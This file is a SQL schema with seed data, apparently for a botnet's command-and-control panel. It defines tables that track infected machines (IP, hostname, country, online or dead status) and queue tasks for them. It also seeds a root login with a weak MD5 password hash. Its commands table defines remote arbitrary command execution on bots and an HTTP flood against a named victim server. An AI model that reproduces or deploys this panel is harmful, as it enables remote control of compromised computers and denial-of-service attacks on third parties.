SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";

CREATE TABLE IF NOT EXISTS db_commands (
	title VARCHAR(50) NOT NULL,
	displayname VARCHAR(50) NOT NULL,
	description text NOT NULL,
	type VARCHAR(25) NOT NULL
);

INSERT INTO db_commands (title, displayname, description, type) VALUES
('exec::@command', 'Execute command|exec::', 'It will run any kind of command. Example: <exec::notepad>', 'System'),
('httpflood::@victim,@seconds', 'Flood website|httpflood::', 'Flood a server by broken HTTP requests. Example: <httpflood::www.server.com,100>', 'Security');

-- -----------------------------------------------------------------------------

CREATE TABLE IF NOT EXISTS db_settings (
	id INT(5) NOT NULL,
	username VARCHAR(10) NOT NULL,
	passwd VARCHAR(32) NOT NULL,

	botsperpage INT(3) NOT NULL,	-- Number of bots per page
	botsoffline	INT(1) NOT NULL,	-- Bots is offline after (in minutes)
	showoffline	INT(1) NOT NULL,	-- Show offline bots
	botsdead FLOAT NOT NULL,		-- Bots is dead after (in days)
	showdead INT(1) NOT NULL		-- Show dead bots
);

INSERT INTO db_settings (id, username, passwd, botsperpage, botsoffline, showoffline, botsdead, showdead) VALUES
(1, 'root', '098f6bcd4621d373cade4e832627b4f6', 25, 5, 1, 1, 1);

-- -----------------------------------------------------------------------------

CREATE TABLE IF NOT EXISTS db_tasks (
	uid VARCHAR(100) NOT NULL,
	params VARCHAR(255) NOT NULL
);

-- -----------------------------------------------------------------------------

CREATE TABLE IF NOT EXISTS db_bots (
	uid VARCHAR(100) NOT NULL DEFAULT 'Unknown',
	ip VARCHAR(15) NOT NULL DEFAULT 'Unknown',
	hostname VARCHAR(35) NOT NULL DEFAULT 'Unknown',
	CC VARCHAR(3) NOT NULL DEFAULT 'XX',
	status INT(1) NOT NULL DEFAULT '0',	-- 0: Offline, 1: Online, 2: Dead
	t_on INT(11) NOT NULL,

	PRIMARY KEY (uid)
);
